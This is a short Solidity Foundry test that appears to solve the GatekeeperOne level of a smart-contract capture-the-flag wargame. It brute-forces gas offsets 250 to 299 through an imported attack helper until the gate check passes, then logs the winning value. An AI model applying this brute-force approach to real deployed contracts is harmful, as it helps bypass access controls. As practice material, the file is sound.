// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel13.sol";
import {AttackGatekeeper} from "../src/level13t.sol";
import {Test, console} from "forge-std/Test.sol";

contract Testlesson13 is Test {
    AttackGatekeeper helper;
    GatekeeperOne private target;

    function setUp() external {
        target = GatekeeperOne(0x5C39f236ce1D7913002D3428C4cb45F7661473cf);
        helper = new AttackGatekeeper();
    }

    function test() public {
        for (uint256 i = 250; i < 300; i++) {
            try helper.enter(address(target), i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("all failed");
    }
}
